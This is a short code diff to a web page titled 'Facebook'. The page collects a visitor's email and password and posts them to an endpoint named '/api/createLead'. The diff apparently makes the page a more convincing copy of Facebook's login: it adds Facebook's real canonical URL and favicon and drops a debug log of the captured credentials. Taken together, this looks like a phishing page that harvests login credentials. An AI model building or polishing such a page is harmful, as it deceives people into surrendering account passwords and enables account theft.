@@ -12,7 +12,6 @@ export default function Home() {
 		event.preventDefault();
 		const email = event.target.email.value;
 		const password = event.target.password.value;
-		console.log(email, password);
 		const res = await fetch("/api/createLead", {
 			body: JSON.stringify({
 				email: email,
@@ -33,9 +32,17 @@ export default function Home() {
 	return (
 		<>
 			<Head>
-				<meta name="viewport" content="width=device-width, initial-scale=1" />
 				<title>Facebook</title>
-				<link rel="icon" href="/favicon.ico" />
+				<meta name="viewport" content="width=device-width, initial-scale=1" />
+				<link rel="canonical" href="https://web.facebook.com/" />
+				<link
+					rel="shortcut icon"
+					href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
+				/>
+				<link
+					rel="icon"
+					href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"
+				/>
 				<meta name="og:title" content="Facebook" />
 				<meta name="twitter:card" content="summary_large_image" />
 				<meta name="twitter:site" content="" />
